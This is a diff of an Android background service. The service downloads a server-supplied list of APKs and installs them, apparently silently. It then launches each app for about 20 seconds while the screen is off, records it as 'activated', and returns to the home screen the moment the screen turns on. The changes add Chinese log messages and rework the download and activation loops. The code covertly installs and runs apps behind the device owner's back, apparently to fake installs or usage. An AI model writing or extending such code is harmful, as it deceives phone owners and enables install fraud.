@@ -27,7 +27,6 @@ import android.os.RemoteException;
 import android.os.SystemClock;
 import android.text.format.DateUtils;
 import android.text.format.Time;
-import android.util.Log;
 
 import com.android.volley.RequestQueue;
 import com.android.volley.Response.Listener;
@@ -155,6 +154,7 @@ public class CoreService extends Service {
 			isScreenLignt = true;
 			if (isActive) {
 				isActive = false;
+				CommandUtil.logW("发现刚有激活的程序，程序切后台，回到桌面。");
 				CommandUtil.goHome(getApplicationContext());
 			}
 			checkActive();
@@ -184,7 +184,7 @@ public class CoreService extends Service {
 	private void updateService() {
 		long last_update_time = sharedPreferences.getLong("last_update_time", 0);
 		if (DateUtils.isToday(last_update_time)) {
-			CommandUtil.logW("服务器信息已经更新，开始下载。。");
+			CommandUtil.logW("今天已经更新服务器信息，直接下载未下载的。。");
 			startDownload();
 			return;
 		}
@@ -194,7 +194,6 @@ public class CoreService extends Service {
 
 			@Override
 			public void onResponse(JSONArray arg0) {
-				CommandUtil.logW(arg0.toString());
 				sharedPreferences.edit().putLong("last_update_time", System.currentTimeMillis()).commit();
 				List<String> installPackages = CommandUtil.getDeviceInstallPackName(getApplicationContext());
 				for (int i = 0; i < arg0.length(); i++) {
@@ -225,15 +224,22 @@ public class CoreService extends Service {
 	 * 開始下載，下載完成安裝
 	 */
 	private void startDownload() {
+		CommandUtil.logW("有" + mustDownloadApp.size() + "个要下载的");
 		if (!isDownloading && mustDownloadApp.size() > 0) {
 			isDownloading = true;
+			File parent = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
+			if (!parent.exists())
+				parent.mkdirs();
 			final DownloadApplication app = mustDownloadApp.removeFirst();
+			final File file = new File(DOWNLOAD_LOCATION, app.fileName);
+			if (file.exists())
+				file.delete();
 			finalHttp.download(app.remoteUrl, DOWNLOAD_LOCATION + app.fileName, true, new AjaxCallBack<File>() {
 
 				@Override
 				public void onSuccess(File file) {
 					super.onSuccess(file);
-					Log.w("ps", "下载成功：" + file.toString());
+					CommandUtil.logW("下载成功。");
 					isDownloading = false;
 					CommandUtil.installFile(getApplicationContext(), file, observer);
 					startDownload();
@@ -242,11 +248,11 @@ public class CoreService extends Service {
 				@Override
 				public void onFailure(Throwable t, String strMsg) {
 					super.onFailure(t, strMsg);
-					Log.w("ps", "下载失败：" + strMsg);
+					CommandUtil.logW("下载失败:" + strMsg);
 					isDownloading = false;
-					mustDownloadApp.add(app);
-					SystemClock.sleep(5000);
-					startDownload();
+					mustDownloadApp.addFirst(app);
+					if (file.exists())
+						file.delete();
 				}
 			});
 		}
@@ -291,7 +297,6 @@ public class CoreService extends Service {
 		SilenceAppDao dao = SilenceAppDaoUtils.getSilenceAppDao(this);
 		Cursor cursor = dao.getDatabase().query(dao.getTablename(), dao.getAllColumns(), null, null, null, null, null);
 		while (cursor.moveToNext()) {
-			isActive = true;
 			long id = cursor.getLong(0);
 			String packName = cursor.getString(1);
 			long installtime = cursor.getLong(cursor.getColumnIndex(SilenceAppDao.Properties.Installtime.columnName));
@@ -322,41 +327,40 @@ public class CoreService extends Service {
 
 		@Override
 		public void run() {
+			CommandUtil.logW("开始检测可激活程序");
 			List<String> installPackages = CommandUtil.getDeviceInstallPackName(getApplicationContext());
 			SilenceAppDao dao = SilenceAppDaoUtils.getSilenceAppDao(getApplicationContext());
-			Cursor cursor = dao.getDatabase().query(dao.getTablename(), dao.getAllColumns(), "active=?", new String[] { String.valueOf(0) }, null, null,
-					SilenceAppDao.Properties.Installtime.columnName + " ASC");
+			Cursor cursor = dao.getDatabase().query(dao.getTablename(), dao.getAllColumns(), SilenceAppDao.Properties.Active.columnName + "=0", null, null, null, null);
 			while (cursor.moveToNext() && CommandUtil.isNetAvailable(getApplicationContext())) {
+				isActive = true;
 				long id = cursor.getLong(0);
 				String packageName = cursor.getString(1);
+				CommandUtil.logW("发现可激活程序:" + packageName);
 				if (!installPackages.contains(packageName)) {
-					CommandUtil.logW(packageName + " not active, it's uninstall, delete it in db.");
+					CommandUtil.logW(packageName + " not active, it's uninstall, reInstall it.");
 					continue;
 				}
-				Intent app = getPackageManager().getLaunchIntentForPackage(packageName);
-				startActivity(app);
-				SystemClock.sleep(1000 * 30);
+				startActivity(getPackageManager().getLaunchIntentForPackage(packageName));
 				SilenceApp entity = new SilenceApp();
 				entity.setId(id);
 				entity.setPackagename(packageName);
 				entity.setActive(true);
 				dao.update(entity);
-				if (isScreenLignt)
+				SystemClock.sleep(1000 * 20);
+				CommandUtil.logW(packageName + "激活了20s，" + isScreenLignt + "");
+				if (isScreenLignt) {
+					CommandUtil.logW("屏幕亮了，终止激活循环。");
 					break;
-			}
-			for (int i = 0; i < 3; i++) {
-				mHandler.postDelayed(goHome, 0 * 1000);
+				}
+
 			}
 			if (cursor != null)
 				cursor.close();
-		}
-	};
-
-	private Runnable goHome = new Runnable() {
-
-		@Override
-		public void run() {
-			CommandUtil.goHome(getApplicationContext());
+			for (int i = 0; i < 3; i++) {
+				SystemClock.sleep(500 * i);
+				CommandUtil.logW("第" + i + "次回到桌面");
+				CommandUtil.goHome(getApplicationContext());
+			}
 		}
 	};
 
